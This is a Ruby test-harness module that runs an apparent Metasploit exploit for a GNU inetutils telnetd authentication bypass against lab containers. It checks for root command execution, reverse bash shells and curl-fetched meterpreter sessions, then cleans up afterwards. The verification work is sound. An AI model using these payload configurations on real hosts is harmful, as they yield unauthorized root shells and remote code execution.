# frozen_string_literal: true

require_relative '../rsync_creds/native'
require 'shellwords'
require 'English'

# Native state, real owner execution and reporting for the Telnet profiles.
module InetutilsTarget
  include RsyncCredentialTarget

  OWNER = 'exploit/linux/telnet/gnu_inetutils_auth_bypass'
  CONFIG = JSON.parse(File.read(File.join(__dir__, 'releases.json'))).freeze

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'inetutils.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_command(label, role, *, required: true)
    super(label, role == 'linux' ? 'app' : role, *, required: required)
  end

  def rc_resource_roles
    %w[app reporting_db]
  end

  def it_native(phase, port)
    output, = rc_command(phase + '-native-' + port.to_s, 'app', 'python3', '/opt/module-target/native.py', @profile.fetch('fixed') ? 'fixed' : 'vulnerable', port.to_s)
    data = JSON.parse(output)
    @rc.fetch(:native) << { phase: phase, port: port, data: data }
    rc_save
    expect(data.fetch('results').length).to eq(6)
    expect(data.fetch('packages').lines).to include("inetutils-telnetd\t#{@profile.fetch('version')}\tamd64\n")
    data.fetch('results').each { |row| expect(!row['proof'].nil?).to eq(row.fetch('expected_success')) }
    data
  end

  def it_snapshot
    output, = rc_command('snapshot', 'app', 'python3', '/opt/module-target/snapshot.py')
    JSON.parse(output).slice('files', 'processes', 'proof_files')
  end

  def it_framed_endpoint
    command = target_runtime.fetch('compose') + ['port', 'app', '2323']
    output, error, status = Open3.capture3(*command)
    @rc.fetch(:commands) << { label: 'framed-endpoint', argv: command, exit: status.exitstatus, stdout_base64: Base64.strict_encode64(output.b), stderr: error }
    expect(status.success?).to be(true), output + error
    match = output.match(/\A127\.0\.0\.1:(\d+)\s*\z/)
    expect(match).not_to be_nil
    { 'host' => '127.0.0.1', 'port' => match[1].to_i }
  end

  def it_file(path)
    output, = rc_command('proof-file', 'app', 'python3', '/opt/module-target/inspect.py', 'file', path)
    JSON.parse(output)
  end

  def it_exists(path)
    output, = rc_command('artifact-exists', 'app', 'python3', '/opt/module-target/inspect.py', 'exists', path)
    JSON.parse(output)
  end

  def it_port
    socket = TCPServer.new(@rc.fetch(:callback).fetch(:bind), 0)
    socket.local_address.ip_port
  ensure
    socket&.close
  end

  def it_tcp(port)
    code = "import json,sys;rows=[line.split()for line in open('/proc/net/tcp').read().splitlines()[1:]];print(json.dumps([{'state':r[3],'uid':int(r[7])}for r in rows if int(r[2].split(':')[1],16)==int(sys.argv[1])]))"
    output, = rc_command('session-sockets', 'app', 'python3', '-c', code, port.to_s)
    JSON.parse(output)
  end

  def it_process(pid)
    output, = rc_command('session-process', 'app', 'python3', '/opt/module-target/inspect.py', 'process', pid.to_s)
    JSON.parse(output)
  end

  def it_call(label, options = {}, surface: 'direct', reuse: false)
    offset = rc_json('framework.instance_variable_get(:@inetutils_events).length')
    record = { label: label, surface: surface, options: options }
    @rc.fetch(:calls) << record
    values = {
      'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'USERNAME' => 'root', 'CMD' => 'true',
      'TERMINAL_TYPE' => 'XTERM-256COLOR', 'TERMINAL_SPEED' => 38400,
      'DisablePayloadHandler' => true, 'WfsDelay' => 0, 'TelnetBannerTimeout' => 8, 'TelnetTimeout' => 3
    }.merge(options)
    unless reuse
      console_command('back')
      expect(console_command('use ' + OWNER)).not_to match(/Failed to load|Unknown command|No results/)
    end
    payload_name = values.fetch('PAYLOAD')
    %w[TARGET PAYLOAD].each { |name| console_command("set #{name} #{values.delete(name)}") }
    if options.key?('CMD') || payload_name == 'cmd/unix/generic'
      command = values.delete('CMD')
      configured = rc_json("begin;active_module.datastore['CMD']=#{command.inspect};active_module.datastore['CMD'];end")
      expect(configured).to eq(command)
      record[:configured_command_base64] = Base64.strict_encode64(command)
    end
    values.delete('CMD')
    endpoint = @surfaces.fetch(surface)
    output = run_target_module(OWNER, 'app', values, endpoint_options: { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port') },
                                                     action: 'run -z', reuse_module: true, allow_errors: true, command_timeout: 100) do |text|
      record[:output_base64] = Base64.strict_encode64(text.b)
      record[:events] = rc_json("framework.instance_variable_get(:@inetutils_events).drop(#{offset})")
      record[:identity] = rc_json('active_module.object_id')
      if command
        preserved = rc_json("active_module.datastore['CMD']")
        record[:command_after_base64] = Base64.strict_encode64(preserved)
        expect(preserved).to eq(command)
      end
      rc_save
    end
    expect(output).not_to match(/Unknown datastore option|Error while running command|Call stack:|Parse error:/)
    expect(record.fetch(:events)).to include(include('event' => 'call', 'method' => 'exploit'))
    [output, record]
  rescue Acceptance::ChildProcessTimeoutError, Acceptance::ChildProcessRecvError
    target_runtime['inetutils_console_failed'] = true
    record[:console_timeout] = true if record
    rc_save
    raise
  end

  def it_canary(label, options = {}, surface: 'direct', reuse: false, content: 'inetutils-owner')
    path = "/tmp/module-target-inetutils-owner-#{Process.pid}-#{label}"
    expect(it_file(path).fetch('exists')).to be(false)
    command = "printf %s #{Shellwords.escape(content)} > #{path}"
    output, record = it_call(label, { 'CMD' => command }.merge(options), surface: surface, reuse: reuse)
    user = options.fetch('USERNAME', 'root')
    positive = !@profile.fetch('fixed') && user != 'module_target_absent'
    if positive
      expect(output).not_to include('Exploit failed', 'Exploit aborted')
      rc_poll { it_file(path).fetch('exists') && it_file(path).fetch('base64') == Base64.strict_encode64(content) }
      expect(it_file(path)).to eq('exists' => true, 'uid' => user == 'root' ? 0 : 1001, 'base64' => Base64.strict_encode64(content))
    else
      expect(it_file(path)).to eq('exists' => false, 'uid' => nil, 'base64' => nil)
      expect(output).to include('Exploit aborted due to failure:')
    end
    record[:proof] = it_file(path)
    rc_save
    record
  ensure
    if path
      rc_command('remove-owner-proof', 'app', 'rm', '-f', path)
      expect(it_file(path).fetch('exists')).to be(false)
    end
  end

  def it_session(label, family, reuse: false)
    payload, type = { 'bash' => ['cmd/unix/reverse_bash', 'shell'], 'fetch' => ['cmd/linux/http/x64/meterpreter_reverse_tcp', 'meterpreter'] }.fetch(family)
    callback = @rc.fetch(:callback)
    port = it_port
    expect(it_tcp(port)).to eq([])
    options = {
      'PAYLOAD' => payload, 'LHOST' => callback.fetch(:host), 'LPORT' => port,
      'ReverseListenerBindAddress' => callback.fetch(:bind), 'DisablePayloadHandler' => false,
      'WfsDelay' => @profile.fetch('fixed') ? 3 : 20
    }
    if family == 'fetch'
      destination = "/tmp/module-target-inetutils-fetch-#{Process.pid}-#{port}"
      options.merge!('FETCH_COMMAND' => 'CURL', 'FETCH_SRVHOST' => callback.fetch(:host), 'FETCH_SRVPORT' => it_port,
                     'FetchListenerBindAddress' => callback.fetch(:bind), 'FETCH_WRITABLE_DIR' => '/tmp',
                     'FETCH_FILENAME' => File.basename(destination), 'FETCH_DELETE' => true)
    end
    output, call = it_call(label, options, reuse: reuse)
    if @profile.fetch('fixed')
      expect(output).to include('Exploit aborted due to failure:')
      expect(rc_json('framework.sessions.keys')).to eq([])
      expect(rc_sql("SELECT count(*) FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}'").strip).to eq('0')
      return
    end
    expect(output).not_to include('Exploit failed', 'Exploit aborted', 'no session was created')
    metadata = rc_poll(30) do
      sessions = rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload,db_id:s.db_record&.id}}')
      ready = File.readlines(@observer.fetch('ready_event_path')).map { |line| JSON.parse(line) }
      sessions.find { |row| row.fetch('type') == type && row['db_id'] && ready.any? { |event| event.fetch('id') == row.fetch('id') } }
    end
    expect(metadata.values_at('owner', 'payload')).to eq([OWNER, 'payload/' + payload])
    identifier = metadata.fetch('id')
    attempt = { label: label, family: family, metadata: metadata, port: port, qualified: false }
    (@rc[:session_attempts] ||= []) << attempt
    rc_save
    proof = "/tmp/module-target-druid-session-#{Process.pid}_#{identifier}-#{identifier}"
    expect(it_file(proof).fetch('exists')).to be(false)
    if type == 'shell'
      result = rc_json("DruidSessionControl.proof(framework,#{identifier},#{proof.inspect})")
      expected = 'druid-session'
    else
      # A Mettle process close can interrupt a just-spawned proof command.
      # A completed filesystem write proves session use without that race.
      channels = rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")
      result = rc_json("begin;s=framework.sessions.fetch(#{identifier});f=nil;begin;f=s.fs.file.new(#{proof.inspect},'wb');f.write('inetutils-session');ensure;f.close if f;end;{id:#{identifier},type:s.type,pid:s.sys.process.getpid,identity:s.sys.config.getuid,api:'fs.file',expected:'inetutils-session'};end")
      expect(rc_json("framework.sessions.fetch(#{identifier}).channels.keys.sort")).to eq(channels)
      expected = 'inetutils-session'
    end
    expect(result).not_to have_key('error')
    rc_poll { it_file(proof).fetch('exists') }
    expect(it_file(proof)).to eq('exists' => true, 'uid' => 0, 'base64' => Base64.strict_encode64(expected))
    native = it_process(result.fetch('pid'))
    expect(native).to include('exists' => true, 'uid' => 0)
    expect(it_tcp(port)).to include(include('state' => '01', 'uid' => 0))
    reports = JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT s.id,s.stype,s.via_exploit,s.via_payload FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}') row"))
    expect(reports).to include(include('id' => metadata.fetch('db_id'), 'stype' => type, 'via_exploit' => OWNER, 'via_payload' => 'payload/' + payload))
    record = { label: label, family: family, metadata: metadata, proof: result, native_process: native, reports: reports, port: port }
    if family == 'fetch'
      delivery = call.fetch(:events).select { |event| event.fetch('event') == 'delivery' }.last
      expect(delivery).to include('elf_class' => 2, 'sha256' => native.fetch('exe_sha256'))
      record[:delivery] = delivery.merge('destination' => destination)
    end
    @rc.fetch(:sessions) << record
    attempt[:qualified] = true
    rc_save
  ensure
    original_error = $ERROR_INFO
    unless target_runtime['inetutils_console_failed']
      if identifier
        rc_command('remove-session-proof', 'app', 'rm', '-f', proof)
        expect(it_file(proof).fetch('exists')).to be(false)
        present = rc_json("framework.sessions.key?(#{identifier})")
        attempt[:present_before_cleanup] = present
        if present
          cleanup = rc_json("DruidSessionControl.dispatch(framework,'exit',#{identifier})")
          attempt[:cleanup_exit] = cleanup
          expect(cleanup).not_to have_key('error') unless original_error
        end
        rc_json("begin;s=framework.sessions[#{identifier}];s.kill if s;{closed:#{identifier}};end")
        rc_poll { it_tcp(port).none? { |row| %w[01 08].include?(row.fetch('state')) } }
        if result && result['pid']
          rc_poll do
            process = it_process(result.fetch('pid'))
            !process.fetch('exists') || process.fetch('state') == 'Z'
          end
          record[:closed_process] = it_process(result.fetch('pid')) if record
        end
        closed = rc_poll { JSON.parse(rc_sql("SELECT coalesce(json_agg(row),'[]'::json) FROM (SELECT id,closed_at FROM sessions WHERE id=#{metadata.fetch('db_id')}) row")).find { |row| row['closed_at'] } }
        record[:closed_report] = closed if record
        attempt[:closed_report] = closed
      end
      if destination
        rc_poll(15) { !it_exists(destination) }
        record[:destination_absent] = true if record
      end
      console_command('jobs -K')
      expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
    end
    rc_save
  end
end
